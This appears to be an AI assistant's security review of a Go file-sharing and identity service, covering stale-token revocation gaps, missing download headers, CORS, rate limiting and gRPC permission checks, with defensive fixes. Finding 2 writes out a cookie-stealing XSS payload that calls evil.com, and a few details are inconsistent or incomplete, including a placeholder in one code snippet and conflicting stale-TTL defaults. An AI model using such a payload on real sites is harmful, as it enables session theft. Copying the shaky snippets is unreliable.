Now I have a comprehensive understanding of the codebase. Let me compile the full security review.

---

# Security Review: aero-id

## Overall Security Posture: **Good**

The codebase shows strong security awareness: consistent authorization checks, parameterized queries, constant-time HMAC comparison, RBAC, circuit breakers, stale-cache graceful degradation, and separation of concerns. The engineering team has clearly invested in security architecture. Below are specific findings, ordered by severity.

---

# Findings

## Finding 1 — Stale Token Identity Can Persist Past Revocation

| Field | Value |
|---|---|
| **Category** | Authorization |
| **Severity** | **High** |
| **Title** | Stale cached token identities served during SSO outage bypass revocation |
| **Location** | `internal/sso/token_cache.go` lines 72-80 (`GetStale`), used at `internal/sso/client.go` lines 162-164 |
| **Description** | When SSO is unreachable, `validateUpstream` falls back to `tokenCache.GetStale()` which serves cached token→uid mappings for an additional `stale_ttl` (default 300s) past their expiry. If a user's token was revoked by SSO (e.g. password reset, session kill), a cached entry remains valid for the cache TTL (60s) + stale TTL (300s) = up to 6 minutes. The stale fallback is triggered by *any* availability error, including transient network blips. |
| **Attack Scenario** | 1. Attacker obtains a valid Bearer token for user Alice (leak, intercept, insider). 2. Alice resets her password, SSO revokes the token. 3. Attacker continues using the token for up to 6 minutes via the cached/stale entry as long as SSO returns Unavailable/DeadlineExceeded. The singleflight group protects against stampede, but a single slow SSO response can keep the stale entry alive. |
| **Impact** | Unauthorized access as a former user whose token was revoked. Attacker can read files, messages, comments belonging to that user. |
| **Recommendation** | **Option A (short-term):** Reduce `stale_ttl` from 300s to 30s in production config. **Option B (medium-term):** Add a token-blacklist endpoint to SSO that aero-id can periodically poll or subscribe to (Redis pub/sub or webhook callback). When a token is evicted from cache (e.g. explicit revoke callback), immediately invalidate it. **Option C (defense):** For write operations (file upload/delete, message send, role grant), require a fresh token validation rather than accepting stale cache. This can be done via a `FreshTokenValidation` method that bypasses stale cache. |
| **Effort** | S (config change) / M (token blacklist endpoint) |

---

## Finding 2 — Missing Content-Disposition Header Enables Drive-by Downloads

| Field | Value |
|---|---|
| **Category** | Data Protection / Input Validation |
| **Severity** | **High** |
| **Title** | Anonymous file download endpoint serves content without Content-Disposition or Content-Type headers |
| **Location** | `internal/handler/http/file.go` lines 152-159 (`Download` method) |
| **Description** | The `/files/dl` handler streams the raw file bytes with `c.Status(http.StatusOK)` and `io.Copy(c.Writer, rc)` without setting `Content-Disposition: attachment`, `X-Content-Type-Options: nosniff`, or `Content-Type` headers. If an attacker uploads an HTML file containing JavaScript (e.g. `<script>...</script>`) as a "public" file or shares one with a victim, the victim's browser will render it as HTML when the presigned URL is visited, executing the attacker's script in the origin's security context. This is a classic Stored XSS via file upload, enabled by the lack of safe download headers. |
| **Attack Scenario** | 1. Attacker uploads a file named `report.html` with content `<script>fetch('https://evil.com/steal?cookie='+document.cookie)</script>`. 2. Attacker obtains a presigned download URL and sends it to Victim (or embeds it as an `img`/`script` tag if MIME type checking is absent). 3. Victim's browser downloads and renders the HTML, executing the malicious script. The script can steal cookies, tokens from local storage, or perform actions as the victim. |
| **Impact** | Stored XSS. The victim's browser treats the response as HTML in the origin context (`http://aero-id:8080`). Any cookies, local storage, or session tokens in that origin are accessible to the attacker's script. Presigned URLs are signed, but once shared, anyone with the URL can trigger the XSS. |
| **Recommendation** | Add security headers to the Download handler: |
| | ```go
c.Header("Content-Disposition", "attachment; filename=\"download\"")
c.Header("X-Content-Type-Options", "nosniff")
c.Header("Content-Type", "application/octet-stream")
```
| | For non-public files served through S3 presigned URLs, configure the bucket to set these headers automatically via the PresignGetObject input. |
| **Effort** | S |

---

## Finding 3 — Write Operations Not Protected Against SSO Degradation

| Field | Value |
|---|---|
| **Category** | Authorization / Threat Model |
| **Severity** | **High** |
| **Title** | File delete/share operations use stale cached identity without re-validation |
| **Location** | `internal/service/file.go` lines 135-146 (`Get` → `canRead`), `internal/service/file_presign.go` (`DownloadURL`), `internal/service/file_share.go` (`ShareFile`, `UnshareFile`) |
| **Description** | All write operations (delete, share, unshare, update metadata) rely on the authenticated actor uid that was set during request authentication. If the token was validated via the stale cache (SSO unreachable), the actor uid reflects a potentially revoked identity. Unlike reads, writes have permanent consequences: file deletion, sharing grants, metadata changes. The circuit breaker helps, but a 300-second stale window on a 5-second SSO timeout means a single blip can permit up to 60 write-attempts (at 1 request / 5s timeout). |
| **Attack Scenario** | Same as Finding 1, but focused on destructive operations. Attacker uses a revoked token during SSO outage to: (a) delete files, (b) share private files with their own account, (c) modify file metadata. |
| **Impact** | Permanent data loss or unauthorized data exposure via share grants. |
| **Recommendation** | Implement a write-policy that requires freshly validated tokens for mutating operations: |
| | ```go
// In service/file_presign.go or a shared helper
func requireFreshAuth(ctx context.Context) (string, error) {
    // Only use if ValidateToken response indicates fresh validation,
    // not stale cache. This requires the SSO client to report staleness.
    uid, fresh, err := ssoClient.ValidateTokenWithFreshness(ctx, token)
    if !fresh {
        return "", apperr.Unauthorized("auth.stale", "re-authentication required for this operation")
    }
    return uid, nil
}
```
| | Alternatively, reduce `stale_ttl` to 0 for production and rely on the circuit breaker alone. |
| **Effort** | M |

---

## Finding 4 — CORS Permissive by Default

| Field | Value |
|---|---|
| **Category** | Compliance / Data Protection |
| **Severity** | **Medium** |
| **Title** | CORS allows all origins when origins list is empty in config |
| **Location** | `internal/middleware/cors.go` lines 15-40 |
| **Description** | When `CORSOrigins` is not configured (empty list), the CORS middleware permits every origin (`Access-Control-Allow-Origin: *`) with all methods (GET,POST,PUT,PATCH,DELETE,OPTIONS) and credentials-allowing headers (Authorization, Content-Type, X-Request-Id). No production environment should reflect arbitrary origins for an authenticated API. While the auth token prevents data access, `*` with credentialed headers is technically incompatible with the Fetch standard (browsers ignore `*` when credentials are involved). However, the wide methods/headers exposure is unnecessary and increases the attack surface for CSRF-like attacks if a browser bug is exploited. |
| **Attack Scenario** | A compromised third-party script running on any website can make authenticated API calls to aero-id on behalf of a user who is logged into the aero-id SSO (if the SSO sets cookies) because CORS reflects any origin with credentialed headers. |
| **Impact** | CSRF-style attacks if the SSO token is stored in a cookie (cookie-based auth) or browser localStorage that can be accessed cross-origin. Since aero-id uses Bearer tokens (not cookies), the practical risk is lower, but it's still a defense-in-depth violation. |
| **Recommendation** | Require explicit CORS origins in production config. Add a startup warning when CORS origins is empty: |
| | ```go
if len(cfg.CORSOrigins) == 0 {
    log.Warn("CORS is permissive (Access-Control-Allow-Origin: *) — set cors_origins in production")
}
```
| | Also restrict methods to only those used: `GET,POST,PATCH,DELETE`. |
| **Effort** | S |

---

## Finding 5 — No MIME Content-Type Verification on File Uploads

| Field | Value |
|---|---|
| **Category** | Input Validation |
| **Severity** | **Medium** |
| **Title** | File content type is client-provided and not validated against actual content |
| **Location** | `internal/service/file.go` line 99 (`mime.ParseMediaType`), `internal/handler/http/file.go` line 53 (`fh.Header.Get("Content-Type")`) |
| **Description** | The `mime_allowed` check in `mimeAllowed()` calls `mime.ParseMediaType(contentType)` which merely parses the string syntax. It does not inspect the actual file bytes. An attacker can upload an executable binary with `Content-Type: image/jpeg` and pass the MIME filter if the admin configured `allowed_mime_types: ["image/jpeg"]`. Combined with Finding 2 (no Content-Disposition), this can facilitate XSS (upload HTML with MIME type `image/png`). |
| **Attack Scenario** | Upload a polyglot GIF/HTML file — a valid GIF image that modern browsers also render as HTML due to IE/Edge legacy behavior — with `Content-Type: image/gif`. When served via the presigned URL, some browsers may render it as HTML, executing embedded JavaScript. |
| **Impact** | Stored XSS, malware distribution, or policy bypass. |
| **Recommendation** | Add server-side MIME detection using Go's `net/http` `DetectContentType` (reads first 512 bytes). Compare detected type against the declared type: |
| | ```go
// In service/file.go Create method:
buf := make([]byte, 512)
n, _ := io.ReadFull(reader, buf)
detected := http.DetectContentType(buf[:n])
if !strings.HasPrefix(detected, strings.Split(in.MimeType, ";")[0]+"/") &&
   !strings.HasPrefix(detected, "image/") && // allow image/* to pass
   ... {
    return nil, apperr.BadRequest("file.type_mismatch", "declared content type does not match actual content")
}
```
| | Also consider adding a `Content-Type` header with the detected type in the download handler. |
| **Effort** | M |

---

## Finding 6 — No Security Headers on HTTP Responses

| Field | Value |
|---|---|
| **Category** | Compliance |
| **Severity** | **Medium** |
| **Title** | HTTP server does not emit security headers on responses |
| **Location** | `internal/handler/http/router.go` (engine setup, no security headers middleware) |
| **Description** | The Gin engine has no middleware that sets security-related HTTP headers: `X-Content-Type-Options: nosniff`, `X-Frame-Options: DENY`, `Content-Security-Policy`, `Referrer-Policy`, `Strict-Transport-Security`. While aero-id is an API service (not serving HTML pages), the download endpoint `/files/dl` serves arbitrary content to browsers, making `X-Content-Type-Options: nosniff` critical to prevent MIME sniffing attacks. |
| **Attack Scenario** | An attacker uploads a file with a benign Content-Type, but the browser's MIME sniffer detects HTML/JavaScript content and renders it as a script, bypassing the Content-Type header entirely. |
| **Impact** | MIME-type confusion attacks, increased XSS surface. |
| **Recommendation** | Add a middleware that sets baseline security headers: |
| | ```go
// internal/middleware/security_headers.go
func SecurityHeaders() gin.HandlerFunc {
    return func(c *gin.Context) {
        c.Header("X-Content-Type-Options", "nosniff")
        c.Header("X-Frame-Options", "DENY")
        c.Header("Referrer-Policy", "strict-origin-when-cross-origin")
        if c.Request.TLS != nil {
            c.Header("Strict-Transport-Security", "max-age=31536000; includeSubDomains")
        }
        c.Next()
    }
}
```
| | Wire it as one of the first global middleware in `router.go`. |
| **Effort** | S |

---

## Finding 7 — Audit Logging Is Best-Effort (Silent Failure)

| Field | Value |
|---|---|
| **Category** | Compliance / Threat Model (Repudiation) |
| **Severity** | **Medium** |
| **Title** | Audit log errors are silently discarded, creating gaps in the audit trail |
| **Location** | Multiple locations: `internal/service/file_share.go` line 85, `internal/service/ban.go` line 77, `internal/service/admin.go` line 73, etc. All audit sites use `_ = s.audit.Log(...)` |
| **Description** | Every audit event is logged with a best-effort pattern: the error from `audit.Log()` is discarded with `_ =`. If the audit store fails (e.g. DB connection issue, insert conflict), the primary operation succeeds but the audit trail has a silent gap. This violates the non-repudiation principle — an attacker could perform sensitive operations (file share grants, role grants, bans) and the audit record would be missing with no warning. |
| **Attack Scenario** | An attacker with system config permissions grants themselves additional roles. The DB write for the role grant succeeds, but the associated audit event insert fails (e.g. transient FK constraint). The operation silently proceeds. Later, when security reviews the audit log, the grant is invisible. |
| **Impact** | Lost forensic evidence, inability to prove who performed which action. Non-repudiation is compromised. |
| **Recommendation** | At minimum, log the audit failure as a `log.Error` so operators can detect the gap: |
| | ```go
if err := s.audit.Log(ctx, event); err != nil {
    log.Error("audit log write failed",
        zap.String("action", event.Action),
        zap.String("actor", event.ActorUID),
        zap.Error(err))
}
```
| | For true non-repudiation, make the audit log write part of the same DB transaction as the primary operation. Since `auditRepo` uses GORM on the same DB, this is feasible by sharing the transaction context. |
| **Effort** | M |

---

## Finding 8 — No Rate Limiting by Default

| Field | Value |
|---|---|
| **Category** | Threat Model (Denial of Service) |
| **Severity** | **Medium** |
| **Title** | Rate limiting is opt-in and disabled by default |
| **Location** | `configs/config.yaml` line 66 (`rate_limit: { enabled: false }`) |
| **Description** | The per-actor rate limiter defaults to disabled. In production, this means an attacker can flood the token-validation endpoint, the file upload endpoint, or the message send endpoint without any throttle. While the SSO circuit breaker provides some protection for the auth path, the message/file/comment APIs have no abuse protection. A single compromised account or a distributed botnet can exhaust DB connections, storage bandwidth, or notification queues. |
| **Attack Scenario** | A botnet of 1000 IPs each sends 100 messages/second to aero-id. Without rate limiting, each request hits the DB (message insert + outbox append + notification insert). The DB pool (max 50 connections) is exhausted, causing cascading failure across all operations. |
| **Impact** | Denial of service for all users. |
| **Recommendation** | Enable rate limiting by default with conservative values in production config. Add a startup warning when rate limiting is disabled: |
| | ```yaml
rate_limit:
  enabled: true
  rps: 20        # per-key (uid/IP)
  burst: 40
```
| | Also add a warning log in `app.go`: |
| | ```go
if !cfg.RateLimit.Enabled {
    log.Warn("rate limiting is DISABLED — API is unprotected against abuse")
}
``` |
| **Effort** | S (config change) |

---

## Finding 9 — gRPC Permission Mapping Is Incomplete

| Field | Value |
|---|---|
| **Category** | Authorization |
| **Severity** | **Medium** |
| **Title** | gRPC permission interceptor only covers 3 of 40+ RPC methods |
| **Location** | `internal/handler/grpc/server.go` lines 191-198 (`requiredPermForMethod`) |
| **Description** | The gRPC `PermissionInterceptor` maps only 3 methods to permissions: `ListAudit` → `PermAuditRead`, `GrantRole` → `PermSystemConfig`, `RevokeRole` → `PermSystemConfig`. All other admin RPCs (Ban, Unban, ListBans) and all other non-admin RPCs have **no permission check at the transport layer**. While the service layer itself enforces authorization (e.g. `banService.Ban` calls `admin.HasPermission`), the permission interceptor is inconsistent — admin routes are protected by both the middleware and the service layer for HTTP, but only by the service layer for gRPC. This defense-in-depth gap means a bypass of the service layer (e.g. due to a bug) would leave gRPC unprotected for many operations. |
| **Attack Scenario** | A future code change refactors `banService.Ban` and accidentally removes the `HasPermission` call. The HTTP path is still protected by `RequirePermission(domain.PermUserBan)` middleware, but the gRPC path has no interceptor for Ban. Any authenticated user could ban arbitrary accounts via gRPC. |
| **Impact** | Privilege escalation via gRPC if the service-layer check is accidentally removed. |
| **Recommendation** | Add all admin RPC methods to `requiredPermForMethod`: |
| | ```go
func requiredPermForMethod(fullMethod string) (string, bool) {
    m := map[string]string{
        "/aero_id.v1.AdminService/ListAudit":   domain.PermAuditRead,
        "/aero_id.v1.AdminService/GrantRole":   domain.PermSystemConfig,
        "/aero_id.v1.AdminService/RevokeRole":  domain.PermSystemConfig,
        "/aero_id.v1.AdminService/ListRoles":   domain.PermAuditRead,
        "/aero_id.v1.AdminService/ListUserRoles": domain.PermAuditRead,
        "/aero_id.v1.AdminService/Ban":         domain.PermUserBan,
        "/aero_id.v1.AdminService/Unban":       domain.PermUserBan,
        "/aero_id.v1.AdminService/ListBans":    domain.PermUserBan,
    }
    perm, ok := m[fullMethod]
    return perm, ok
}
``` |
| **Effort** | S |

---

## Finding 10 — gRPC Error Handling Leaks Internal Codes

| Field | Value |
|---|---|
| **Category** | Data Protection / Information Disclosure |
| **Severity** | **Low** |
| **Title** | Error code values (internal error codes) exposed to gRPC clients |
| **Location** | `internal/pkg/errors/errors.go` lines 66-70 (`GRPCError`), `internal/handler/grpc/validate.go` lines 19-21 (`parseID`) |
| **Description** | The `GRPCError` function maps `*AppError` to gRPC status using `ae.GRPC` code and `ae.Message`. The message field is a user-facing string, not a technical detail. This is acceptable. However, `parseID` in validate.go returns `status.Errorf(codes.InvalidArgument, "invalid %s: %s", fieldName, err.Error())` which includes the underlying parse error. If the parsing error contains the invalid value (which `idgen.Parse` may include), it could leak partial information. |
| **Attack Scenario** | An attacker sends malformed UUIDs to probe parsing behavior. The error response includes the raw parse error which may reveal internal validation details. |
| **Impact** | Minimal — UUID parse errors are low-value. |
| **Recommendation** | Use static error messages: `"invalid %s"` instead of `"invalid %s: %s"`. |
| **Effort** | S |

---

## Finding 11 — `ExpiresAt` in TokenCache Uses Server Time, Not SSO Time

| Field | Value |
|---|---|
| **Category** | Cryptography / Session Management |
| **Severity** | **Low** |
| **Title** | Token cache expiry is clamped to local server time, not SSO-provided expiry |
| **Location** | `internal/sso/token_cache.go` lines 88-93 (`Set` method) |
| **Description** | The `Set` method clamps the token's expiry to `min(SSO_expiry, now + maxTTL)`. This means a token the SSO issued with 1-hour lifetime will expire in 60 seconds (the default `TokenCacheTTL`). While safe (overriding to a shorter expiry), it means the cache evicts tokens much earlier than SSO intended, forcing more frequent re-validation RPCs. This is a performance concern, not a security vulnerability per se, but it interacts with the stale-cache mechanism: a token expires in cache in 60s, then enters the 300s stale window. After the full 360s, the token is truly gone. |
| **Attack Scenario** | None directly. The clamping is conservative. However, if `TokenCacheTTL` is set very large (e.g. 24h) and `stale_ttl` is also large, a leaked token could be used for an entire day without re-validation. |
| **Recommendation** | Document that `token_cache_ttl` + `stale_ttl` = maximum time a revoked token remains usable. Ensure production configs are tight (default 60s + 30s stale is reasonable). Add validation in config to warn if the combined window exceeds 10 minutes. |
| **Effort** | S (documentation / config validation) |

---

## Finding 12 — No TLS Termination at the Service Level

| Field | Value |
|---|---|
| **Category** | Data Protection / Compliance |
| **Severity** | **Low** |
| **Title** | Service does not terminate TLS for HTTP or gRPC clients |
| **Location** | `internal/app/new.go` (`http.Server` without TLS config), `internal/handler/grpc/server.go` (plain gRPC) |
| **Description** | The HTTP server and gRPC server listen on plain TCP without TLS. The SSO gRPC client *does* support TLS/mTLS (with SPKI pinning), but the inbound connections to aero-id are unencrypted. This is likely intentional — the deployment is expected to use a reverse proxy (nginx, Envoy, or cloud LB) for TLS termination. However, in a zero-trust network or direct-exposure scenario, all traffic is in clear text. The README/config does not document this assumption. |
| **Attack Scenario** | An attacker on the same network segment can intercept all API traffic, including Bearer tokens and file content, via passive eavesdropping (Man-in-the-Middle). |
| **Impact** | Credential theft, data exposure. |
| **Recommendation** | Document in the config and README that TLS termination must be handled by a reverse proxy in production. Optionally, add optional native TLS support to the `http.Server` and `grpc.Server` for deployments that cannot use a reverse proxy. |
| **Effort** | L (full TLS support) / S (documentation) |

---

## Finding 13 — Delegated Storage Key Prefix Check Can Be Bypassed

| Field | Value |
|---|---|
| **Category** | Authorization |
| **Severity** | **Low** |
| **Title** | Storage key prefix check uses string.HasPrefix which is case-sensitive but UIDs may not be |
| **Location** | `internal/service/file_presign.go` line 100 (`strings.HasPrefix(in.StorageKey, actor+"/")`) |
| **Description** | The `CompleteUpload` handler verifies that the storage key is prefixed with the actor's UID: `strings.HasPrefix(in.StorageKey, actor+"/")`. This is a sound check, but it is case-sensitive. If SSO UIDs are case-insensitive (e.g. emails), an attacker with uid `Alice` could complete an upload for key `alice/2026/01/...` by claiming the storage key belongs to them. The check would fail because `"Alice/" != "alice/"`, but the underlying object was created by `NewKey(actor)` which uses the case as-is from SSO. So this check is self-consistent. |
| **Attack Scenario** | Only exploitable if two SSO accounts exist that differ only by case (e.g. `alice` and `Alice`), which SSO should prevent. |
| **Impact** | Very low. |
| **Recommendation** | Add a note that SSO must enforce case-sensitive UIDs or case-insensitive uniqueness. For defense-in-depth, add `strings.EqualFold` comparison or document the assumption. |
| **Effort** | S |

---

# STRIDE Summary

| Category | Risk Level | Key Findings |
|---|---|---|
| **S**poofing | **Low** | Token validation via SSO with HMAC-signed presigned URLs. Stale cache is the main risk (Finding 1). |
| **T**ampering | **Low** | Parameterized queries prevent SQL injection. HMAC signatures prevent URL tampering. |
| **R**epudiation | **Medium** | Audit logging is best-effort with silent failures (Finding 7). No way to prove who performed an action if the audit store fails. |
| **I**nformation Disclosure | **Medium** | Missing Content-Disposition headers (Finding 2), permissive CORS (Finding 4), no security headers (Finding 6). |
| **D**enial of Service | **Medium** | Rate limiting disabled by default (Finding 8). No global request size limits beyond file upload caps. |
| **E**levation of Privilege | **Medium** | gRPC permission mapping incomplete (Finding 9). Stale token identity permits stale writes (Finding 3). |

---

# Final Summary

## Overall Security Posture: **Good** (with Medium-level issues that should be addressed before production)

The codebase demonstrates strong security fundamentals: consistent authorization enforcement in the service layer, parameterized queries throughout, constant-time HMAC comparison, circuit-breaker pattern for dependency failure, proper error envelope to avoid leaking internals, and well-structured RBAC infrastructure.

## Top 3 Critical Issues

1. **Stale token identity persists past revocation (High)** — When SSO is unreachable, cached token→uid mappings can serve revoked tokens for up to 6 minutes. This is the most impactful finding because it directly undermines the authentication model.

2. **Missing Content-Disposition header on file downloads (High)** — Files served through the anonymous presigned-URL endpoint can be rendered as HTML in the browser, enabling stored XSS.

3. **Write operations not protected against stale authentication (High)** — Destructive operations (delete, share, update) use potentially stale cached identities without requiring a fresh validation.

## Top 3 Quick Wins

1. **Add security headers middleware (S effort)** — `X-Content-Type-Options: nosniff`, `Content-Disposition: attachment` on the download handler, and a global security-headers middleware would immediately close the XSS vector from Finding 2.

2. **Enable rate limiting in default config (S effort)** — Flip `rate_limit.enabled` to `true` with conservative values in the example config, and add a startup warning when it's disabled.

3. **Complete the gRPC permission mapping (S effort)** — Add all admin RPC methods to `requiredPermForMethod` so the gRPC transport layer matches HTTP's defense-in-depth.

## Security Debt

- **Fuzz testing:** No fuzz targets for input parsing (UUID, pagination cursors, MIME type parsing, duration parsing).
- **Dependency scanning:** The project uses `goreleaser` and Docker, but there's no mention of dependency vulnerability scanning (e.g. `govulncheck`, Trivy, or Snyk) in the CI pipeline.
- **Secrets scanning:** No mention of `git-secrets` or similar pre-commit hooks to prevent accidental credential commits.
- **Penetration testing:** The file upload/download path in particular would benefit from targeted security testing (polyglot files, path traversal, size bombs).

Overall, this is a well-architected service with security integrated into the design. The medium-severity findings are mostly around hardening the edges (headers, rate limiting, audit completeness) rather than fundamental architectural flaws. With the recommended fixes, this service would be production-ready for security-sensitive workloads.
